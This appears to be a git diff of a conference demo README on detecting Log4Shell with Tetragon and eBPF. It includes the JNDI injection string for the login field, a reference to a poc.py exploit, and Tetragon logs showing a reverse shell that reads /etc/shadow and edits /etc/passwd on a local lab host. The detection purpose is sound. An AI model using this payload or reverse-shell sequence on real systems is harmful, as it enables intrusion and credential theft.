@@ -7,6 +7,17 @@ SCALE 20x, Pasadena during the `The Next Log4jshell?! Preparing for CVEs with eB
 
 Setup Ubuntu machine
 
+(Terminal 0): Start Tetragon:
+```bash
+sudo systemctl daemon-reload
+sudo systemctl start tetragon-enterprise
+```
+
+(Terminal 0): Start observing the events from Tetragon:
+```bash 
+sudo hubble-enterprise getevents -o compact
+```
+
 ## Demo
 
 (Terminal 1): Run the vulnerable web application as a container on the host network, so we will make sure it uses
@@ -47,7 +58,7 @@ python3 poc.py --userip localhost --webport 8000 --lport 9001
 Listening on 0.0.0.0:1389
 ```
 
-Paste the created JNDI lookup string `${jndi:ldap://localhost:1389/a}` to either the username or
+(Terminal 1): Paste the created JNDI lookup string `${jndi:ldap://localhost:1389/a}` to either the username or
 password field of the web application, then click on `Login`:
 
 ![Screenshot](log4j_malicious_string.png)
@@ -139,4 +150,57 @@ systemd-network:*:17043:0:99999:7:::
 systemd-resolve:*:17043:0:99999:7:::
 systemd-bus-proxy:*:17043:0:99999:7:::
 messagebus:*:17044:0:99999:7:::
+```
+
+Starting from the beginning, first we can see that the vulnerable web application reached out to the 
+LDAP server on port `1389` and downloaded the `Exploit.class` java file:
+
+```bash
+🔌 connect  /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java tcp 127.0.0.1:19685 -> 127.0.0.1:1389
+🔌 connect  /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java tcp 127.0.0.1:58085 -> 127.0.0.1:8000
+🧹 close    /usr/bin/python3 tcp 127.0.0.1:16415 -> 127.0.0.1:58850
+🧹 close    /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java tcp 127.0.0.1:58085 -> 127.0.0.1:8000
+```
+
+Then we can see the connection to `9001` from the container of the web application and that 
+the reverse shell was sent. And then we can see that the `/bin/sh` process started:
+```bash
+🚀 process  /bin/sh
+🔌 connect  /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java tcp 127.0.0.1:31405 -> 127.0.0.1:9001
+🧹 close    /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java tcp 10.186.0.24:36895 -> 5.204.80.64:60463
+```
+
+```bash
+🚀 process  /bin/ls -l
+📬 open     /bin/ls /etc/passwd
+📪 close    /bin/ls
+💥 exit     /bin/ls -l 0
+```
+
+```bash
+🚀 process  /bin/cat /etc/passwd
+📬 open     /bin/cat /etc/passwd
+📪 close    /bin/cat
+💥 exit     /bin/cat /etc/passwd 0
+```
+
+```bash
+🚀 process  /bin/cat /etc/shadow
+📬 open     /bin/cat /etc/shadow
+📪 close    /bin/cat
+💥 exit     /bin/cat /etc/shadow 0
+```
+
+```bash
+🚀 process  /usr/bin/vi /etc/passwd
+📬 open     /usr/bin/vi /etc/passwd
+📪 close    /usr/bin/vi
+📬 open     /usr/bin/vi /etc/passwd
+📪 close    /usr/bin/vi
+📬 open     /usr/bin/vi /etc/passwd
+📪 close    /usr/bin/vi
+📬 open     /usr/bin/vi /etc/passwd
+📝 write    /usr/bin/vi /etc/passwd 1253 bytes
+📪 close    /usr/bin/vi
+💥 exit     /usr/bin/vi /etc/passwd 0
 ```
